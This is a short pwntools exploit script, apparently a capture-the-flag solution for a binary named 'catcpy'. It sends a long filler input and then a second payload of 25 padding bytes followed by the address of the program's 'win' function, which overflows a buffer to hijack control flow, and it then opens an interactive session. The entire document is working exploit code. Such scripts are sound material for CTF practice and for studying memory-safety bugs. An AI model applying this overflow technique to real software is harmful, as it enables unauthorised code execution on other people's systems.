from pwn import *

elf = ELF('./catcpy')
io = process(['gdbserver', 'localhost:1234', './catcpy'])
# io = process(elf.path)

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Data: ', b'a'*255)

io.sendlineafter(b'> ', b'2')
payload = b'a' * 25
payload += p64(elf.symbols['win'])
io.sendlineafter(b'Data: ', payload)

io.sendlineafter(b'> ', b'3')
io.interactive()
